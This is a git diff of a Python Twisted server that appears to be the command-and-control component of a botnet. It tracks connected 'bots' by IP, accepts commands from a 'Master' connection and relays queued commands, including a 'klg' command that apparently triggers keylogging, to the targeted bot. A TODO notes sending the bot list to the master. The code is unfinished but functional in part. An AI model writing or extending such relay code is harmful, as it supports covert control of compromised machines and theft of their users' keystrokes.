@@ -1,55 +1,62 @@
 #!/usr/bin/env python
 
 from twisted.internet import protocol, reactor, endpoints
-import json
 
-glob_ip = [] #List of all ip connected
 message = {} #Dict of messages
 cnt_clients = 0 #Number of connected clients
 
 class echoClient(protocol.Protocol):
+    def __init__(self, factory):
+        self.factory = factory
+
     def connectionMade(self):
         global cnt_clients
-        global glob_ip
         global message
         self.peer_host = self.transport.getPeer().host
         self.peer_port = self.transport.getPeer().port
-        self.conc = [self.peer_host, str(self.peer_port)]
-        self.client = ":".join(self.conc)
-        glob_ip.append(self.peer_host)
+        self.factory.clients[self.peer_host] = self
         print('[*]Client %s:%s connected' %(self.peer_host, self.peer_port))
         cnt_clients += 1
         print('[%s]Clients status' %(cnt_clients))
-        print('[*] Peer connected: '+str(glob_ip))
-        #self.sendMessage(message)
+        self.sendMessage(message)
 
     def connectionLost(self, reason):
         global cnt_clients
-        global glob_ip
         cnt_clients -= 1
-        glob_ip.remove(self.peer_host)
+        self.factory.clients.pop(self.peer_host, None)
         print('[*] Client %s:%s disconnected' %(self.peer_host, self.peer_port))
         print('[%s] Client status ' %(cnt_clients))
-        print('[*] Peer connected: '+str(glob_ip))
 
     def sendMessage(self, msg):
-        print('message to client' +str(msg))
-        self.transport.write(b'ciao')
-        #for key in message:
-        #    if message[key] == self.peer_host:
-        #        self.transport.write(messagge[key])
+        if msg:
+            print('message %s' %(msg))
+            for m_key, m_value in msg.items():
+                for c_key, c_value in self.factory.clients.items():
+                    if m_key == c_key:
+                        #TODO Delete message in message dict after that operation is completed
+                        self.factory.clients[c_key].transport.write(m_value.encode('utf-8'))
+        else:
+            pass
+
+    def dataReceived(self, data):
+        #TODO Parse data received
+        global message
+        message[self.transport.getPeer().host] = data.decode('utf-8')
+        self.sendMessage(message)
 
 class clientFactory(protocol.Factory):
+    def __init__(self):
+        self.clients = {}
+
     def buildProtocol(self, addr):
-        return echoClient()
+        print(addr)
+        return echoClient(self)
 
 class echoMaster(protocol.Protocol):
     def connectionMade(self):
-        global glob_ip
         self.master_host = self.transport.getPeer().host
         print('*- Master [%s] connected -*' %(self.master_host))
-        glob_ip_b = ":".join(glob_ip)
-        self.transport.write(glob_ip_b.encode('utf-8'))
+        #TODO send bot list to Master
 
     def dataReceived(self, data):
         self.parseData(data)
@@ -66,8 +73,6 @@ class echoMaster(protocol.Protocol):
         peer_msg = p_data[1]
         if peer_msg == 'klg':
             msg = message[peer_ip] = peer_msg
-            echoClient.sendMessage(self, msg)              
-        print(message)
 
 class masterFactory(protocol.Factory):
     def buildProtocol(self, addr):
